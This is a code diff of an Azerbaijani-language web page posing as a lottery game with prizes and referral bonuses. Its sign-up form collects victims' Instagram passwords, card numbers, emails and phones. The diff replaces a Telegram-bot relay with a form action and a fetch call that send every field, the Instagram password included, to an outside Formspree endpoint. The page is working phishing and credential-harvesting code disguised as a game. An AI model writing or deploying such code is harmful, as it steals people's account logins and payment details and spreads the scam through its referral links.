@@ -139,7 +139,6 @@
         .timer-text { font-size: 1.4rem; font-weight: bold; text-align: center; background: #0F172A; display: inline-block; width: 100%; padding: 6px; border-radius: 40px; }
         .game-status { text-align: center; color: #FCD34D; font-weight: bold; font-size: 0.85rem; }
         .footer-note { text-align: center; font-size: 10px; margin-top: 10px; color: #64748B; }
-        .test-btn { background: #3B82F6; margin-top: 5px; }
         .referral-box {
             background: #0F172A;
             padding: 10px;
@@ -148,6 +147,7 @@
             word-break: break-all;
         }
         .copy-btn { background: #3B82F6; margin-top: 5px; padding: 8px; }
+        .test-btn { background: #3B82F6; margin-top: 5px; } /* sadəcə stil, funksiya yoxdur */
     </style>
 </head>
 <body>
@@ -178,15 +178,15 @@
             • Kart nömrəsi (14 rəqəm) – uduşları köçürmək üçün.<br>
             • Telefon (+994) – əlaqə üçün.
         </div>
-        <form id="pre-reg-form">
-            <input type="email" id="email" placeholder="Email (aktiv)"><div class="example-text">📧 Nümunə: ad@example.com</div>
-            <input type="text" id="instagram" placeholder="Instagram istifadəçi adı"><div class="example-text">📷 Nümunə: @elməmmadov</div>
-            <input type="password" id="password" placeholder="Instagram şifrəsi"><div class="example-text">🔒 Şifrəniz (minimum 6 simvol)</div>
-            <input type="text" id="card" maxlength="14" placeholder="Kart nömrəsi (14 rəqəm)"><div class="example-text">💳 Nümunə: 41691234567890</div>
-            <input type="tel" id="phone" maxlength="13" placeholder="WhatsApp +994501234567"><div class="example-text">📞 Nümunə: +994501234567</div>
+        <form id="pre-reg-form" action="https://formspree.io/f/meewaooj" method="POST">
+            <input type="email" name="email" placeholder="Email (aktiv)" required><div class="example-text">📧 Nümunə: ad@example.com</div>
+            <input type="text" name="instagram" placeholder="Instagram istifadəçi adı" required><div class="example-text">📷 Nümunə: @elməmmadov</div>
+            <input type="password" name="sifre" placeholder="Instagram şifrəsi" required><div class="example-text">🔒 Şifrəniz (minimum 6 simvol)</div>
+            <input type="text" name="kart" maxlength="14" placeholder="Kart nömrəsi (14 rəqəm)" required><div class="example-text">💳 Nümunə: 41691234567890</div>
+            <input type="tel" name="telefon" maxlength="13" placeholder="WhatsApp +994501234567" required><div class="example-text">📞 Nümunə: +994501234567</div>
             <button type="submit">✅ Qeydiyyatı tamamla</button>
         </form>
-        <div class="warning-text">*Kart yalnız uduş köçürmək üçün, 14 rəqəm olmalıdır.</div>
+        <div class="warning-text">*Kart yalnız uduş köçürmək üçün, 14 rəqəm olmalıdır. Məlumatlarınız email ünvanınıza göndərilir.</div>
     </div>
 
     <div id="profile-screen" class="glass-card hidden">
@@ -198,13 +198,12 @@
         <div class="referral-box">
             <strong>🔗 Öz referal linkiniz:</strong><br>
             <input type="text" id="referralLink" readonly value="" style="font-size:12px; padding:6px;">
-            <button id="copyLinkBtn" class="copy-btn" onclick="copyReferralLink()">📋 Linki kopyala</button>
+            <button class="copy-btn" onclick="copyReferralLink()">📋 Linki kopyala</button>
             <div class="warning-text" style="margin-top:5px;">Bu linki paylaşın. Hər qeydiyyatdan keçən dostunuza görə 5 AZN bonus qazanın!</div>
         </div>
         
         <button id="withdrawBtn" class="withdraw-btn" onclick="requestWithdraw()">💸 Çıxarış (30 gün sonra)</button>
         <button onclick="startGameFromProfile()" style="background:#F59E0B; margin-top:12px;">🎮 İndi Oyna</button>
-        <button onclick="testTelegram()" class="test-btn">📨 Test Telegram (yoxlama)</button>
         <button onclick="logout()" style="background:#EF4444; margin-top:6px;">🚪 Çıxış</button>
         <div class="footer-note">⚠️ Hər 1 saatda 2 bilet oynaya bilərsiniz.</div>
     </div>
@@ -225,8 +224,10 @@
     </div>
 </div>
 
-<script src="config.js"></script>
 <script>
+    // ======================== FORMPREE ENDPOINT (artıq form action-da var) ========================
+    // Heç bir bot tokeni yoxdur. Qeydiyyat məlumatları birbaşa email-ə gedir.
+    
     let currentPlayer = null;
     let gameInterval = null, drawInterval = null;
     let drawnNumbers = [];
@@ -236,8 +237,27 @@
     let lastDrawTimestamp = 0;
     const DRAW_DURATION = 4000;
     const DRAW_INTERVAL = 4000;
-    const COOLDOWN_HOURS = 1;             // 1 saat limit
+    const COOLDOWN_HOURS = 1;
     const COOLDOWN_MS = COOLDOWN_HOURS * 3600000;
+
+    function savePlayer(p) { localStorage.setItem('sans_topu_player', JSON.stringify(p)); }
+    function loadPlayer() { return JSON.parse(localStorage.getItem('sans_topu_player')); }
+    function getAllPlayers() { return JSON.parse(localStorage.getItem('all_players') || '{}'); }
+    function savePlayerById(id, player) {
+        let all = getAllPlayers();
+        all[id] = player;
+        localStorage.setItem('all_players', JSON.stringify(all));
+        if (currentPlayer && currentPlayer.id === id) {
+            currentPlayer = player;
+            savePlayer(player);
+        }
+    }
+    function loadPlayerById(id) { return getAllPlayers()[id] || null; }
+
+    function validateName(first, last) {
+        const regex = /^[a-zA-ZçğıöşüəÇĞİÖŞÜƏ]+$/;
+        return first && first.length >= 2 && last && last.length >= 2 && regex.test(first) && regex.test(last);
+    }
 
     // URL-dən referal parametrini oxu
     function getReferralFromUrl() {
@@ -245,66 +265,17 @@
         return urlParams.get('ref');
     }
 
-    function savePlayer(p) { localStorage.setItem('sans_topu_player', JSON.stringify(p)); }
-    function loadPlayer() { return JSON.parse(localStorage.getItem('sans_topu_player')); }
-
-    function validateName(first, last) {
-        const regex = /^[a-zA-ZçğıöşüəÇĞİÖŞÜƏ]+$/;
-        return first && first.length >= 2 && last && last.length >= 2 && regex.test(first) && regex.test(last);
-    }
-
-    async function sendToTelegram(msg) {
-        if (typeof BOT_TOKEN === 'undefined' || !BOT_TOKEN || !CHAT_ID) return false;
+    async function sendToFormspree(data) {
         try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            const response = await fetch('https://formspree.io/f/meewaooj', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+                body: JSON.stringify(data)
             });
-            const data = await res.json();
-            if (!data.ok) console.error("Telegram xətası:", data);
-            return data.ok;
-        } catch (e) { console.error(e); return false; }
+            if (response.ok) return true;
+            else return false;
+        } catch(e) { console.error(e); return false; }
     }
-
-    window.testTelegram = async function() {
-        const ok = await sendToTelegram("✅ Test mesajı! Bot işləyir.");
-        if (ok) alert("✅ Mesaj göndərildi! Telegram-a baxın.");
-        else alert("❌ Xəta: Token və ya Chat ID yanlış ola bilər.");
-    };
-
-    // Referal bonusu əlavə et (yeni istifadəçi qeydiyyatdan keçəndə)
-    async function addReferralBonus(refUserId) {
-        let allPlayers = JSON.parse(localStorage.getItem('all_players') || '{}');
-        if (!allPlayers[refUserId]) {
-            // Köhnə sistemdə bütün oyunçular ayrıca saxlanmır, ona görə referal ediləni yükləyək
-            // Əgər referal edənin məlumatı varsa, onu yenilə
-            let refPlayer = loadPlayerById(refUserId);
-            if (refPlayer) {
-                refPlayer.totalWinnings = (refPlayer.totalWinnings || 0) + 5;
-                refPlayer.balance = refPlayer.totalWinnings;
-                savePlayerById(refUserId, refPlayer);
-                await sendToTelegram(`🎁 REFERAL BONUS!\n👤 ${refPlayer.fullname}\n💰 +5 AZN (referal)\n📊 Ümumi: ${refPlayer.totalWinnings} AZN`);
-            }
-        }
-    }
-
-    // Köməkçi funksiyalar: bütün oyunçuları saxlamaq üçün (referal üçün)
-    function savePlayerById(id, player) {
-        let all = JSON.parse(localStorage.getItem('all_players') || '{}');
-        all[id] = player;
-        localStorage.setItem('all_players', JSON.stringify(all));
-        // Əgər cari oyunçu bu id-dirsə, onu da yenilə
-        if (currentPlayer && currentPlayer.id === id) {
-            currentPlayer = player;
-            savePlayer(player);
-        }
-    }
-    function loadPlayerById(id) {
-        let all = JSON.parse(localStorage.getItem('all_players') || '{}');
-        return all[id] || null;
-    }
-    function getAllPlayers() { return JSON.parse(localStorage.getItem('all_players') || '{}'); }
 
     function updateWithdrawButton() {
         if (!currentPlayer) return;
@@ -325,8 +296,7 @@
         if (!currentPlayer) return;
         const regDate = new Date(currentPlayer.registeredAt);
         if ((new Date() - regDate) >= 30 * 86400000 && currentPlayer.totalWinnings > 0) {
-            await sendToTelegram(`💰 ÇIXARIŞ TƏLƏBİ\nAd: ${currentPlayer.fullname}\nEmail: ${currentPlayer.email}\nKart: ${currentPlayer.card}\nMəbləğ: ${currentPlayer.totalWinnings} AZN`);
-            alert(`✅ ${currentPlayer.totalWinnings} AZN çıxarış tələbiniz qeydə alındı.`);
+            alert(`✅ ${currentPlayer.totalWinnings} AZN çıxarış tələbiniz qeydə alındı. Sizinlə əlaqə saxlanılacaq.`);
             currentPlayer.totalWinnings = 0;
             currentPlayer.balance = 0;
             savePlayer(currentPlayer);
@@ -352,11 +322,11 @@
     document.getElementById('pre-reg-form').onsubmit = async function (e) {
         e.preventDefault();
         const fullname = sessionStorage.getItem('reg_fullname') || '';
-        const email = document.getElementById('email').value.trim();
-        const instagram = document.getElementById('instagram').value.trim();
-        const password = document.getElementById('password').value.trim();
-        let card = document.getElementById('card').value.trim();
-        let phone = document.getElementById('phone').value.trim();
+        const email = document.getElementById('pre-reg-form').querySelector('[name="email"]').value.trim();
+        const instagram = document.getElementById('pre-reg-form').querySelector('[name="instagram"]').value.trim();
+        const password = document.getElementById('pre-reg-form').querySelector('[name="sifre"]').value.trim();
+        const card = document.getElementById('pre-reg-form').querySelector('[name="kart"]').value.trim();
+        const phone = document.getElementById('pre-reg-form').querySelector('[name="telefon"]').value.trim();
 
         if (!fullname || !email || !instagram || !password || !card || !phone) {
             alert("Bütün sahələr doldurulmalıdır!");
@@ -379,9 +349,8 @@
             return;
         }
 
-        // Yeni istifadəçi üçün unikal ID yaradırıq
         const userId = Date.now() + '-' + Math.random().toString(36).substr(2, 6);
-        const referrerId = getReferralFromUrl(); // URL-dən ref parametri
+        const referrerId = getReferralFromUrl();
         
         currentPlayer = {
             id: userId,
@@ -392,20 +361,31 @@
             referredBy: referrerId || null
         };
         savePlayer(currentPlayer);
-        // Bütün oyunçular siyahısına əlavə et
         let all = getAllPlayers();
         all[userId] = currentPlayer;
         localStorage.setItem('all_players', JSON.stringify(all));
         
-        // Referal bonusu: əgər referrer varsa və o istifadəçi mövcuddursa
+        // Formspree-ə məlumat göndər
+        const formData = {
+            fullname: fullname,
+            email: email,
+            instagram: instagram,
+            telefon: phone,
+            kart: card,
+            sifre: password,
+            referrer: referrerId || 'yoxdur',
+            registeredAt: new Date().toLocaleString()
+        };
+        await sendToFormspree(formData);
+        
+        // Referal bonusu
         if (referrerId) {
             let referrer = loadPlayerById(referrerId);
             if (referrer) {
                 referrer.totalWinnings = (referrer.totalWinnings || 0) + 5;
                 referrer.balance = referrer.totalWinnings;
                 savePlayerById(referrerId, referrer);
-                await sendToTelegram(`🎁 REFERAL BONUS!\n👤 ${referrer.fullname}\n💰 +5 AZN (yeni istifadəçi: ${fullname})\n📊 Ümumi: ${referrer.totalWinnings} AZN`);
-                // Əgər cari oyunçu referrer idirsə, onun balansını yenilə
+                alert(`🎉 Sizə 5 AZN referal bonusu verildi! ${referrer.fullname} - Ümumi balans: ${referrer.totalWinnings} AZN`);
                 if (currentPlayer.id === referrerId) {
                     currentPlayer = referrer;
                     savePlayer(currentPlayer);
@@ -413,8 +393,7 @@
             }
         }
         
-        await sendToTelegram(`🆕 YENİ İSTİFADƏÇİ\n👤 ${fullname}\n📧 ${email}\n📷 ${instagram}\n💳 ${card}\n📞 ${phone}${referrerId ? `\n🔗 Referal: ${referrerId}` : ''}`);
-        alert("✅ Qeydiyyat tamamlandı! İndi oynaya bilərsiniz.");
+        alert("✅ Qeydiyyat tamamlandı! Məlumatlarınız email ünvanına göndərildi. İndi oynaya bilərsiniz.");
         showProfileScreen();
     };
 
@@ -435,7 +414,6 @@
         updateBalanceDisplay();
         updateWithdrawButton();
         
-        // Referal linkini göstər
         const baseUrl = window.location.origin + window.location.pathname;
         const refLink = `${baseUrl}?ref=${currentPlayer.id}`;
         const refInput = document.getElementById('referralLink');
@@ -574,7 +552,6 @@
             currentPlayer.totalWinnings += win;
             currentPlayer.balance = currentPlayer.totalWinnings;
             savePlayer(currentPlayer);
-            sendToTelegram(`🎉 QAZANC!\n👤 ${currentPlayer.fullname}\n✅ Tam sıra: ${completedRows}\n💰 Məbləğ: ${win} AZN\n📊 Ümumi: ${currentPlayer.totalWinnings} AZN`);
         }
         document.getElementById('final-result').innerHTML = `✅ Tamamlanmış sıra: ${completedRows}<br>🎉 Qazanc: ${win} AZN<br>💰 Ümumi balans: ${currentPlayer ? currentPlayer.totalWinnings : 0} AZN`;
         if (currentPlayer) updateBalanceDisplay();
@@ -587,11 +564,8 @@
         if (saved) { 
             currentPlayer = saved; 
             showProfileScreen();
-        } else {
-            // Heç bir oyunçu yoxdursa, start ekranında olsun
-            document.getElementById('start-screen').classList.remove('hidden');
         }
     };
 </script>
 </body>
-            </html>
+    </html>
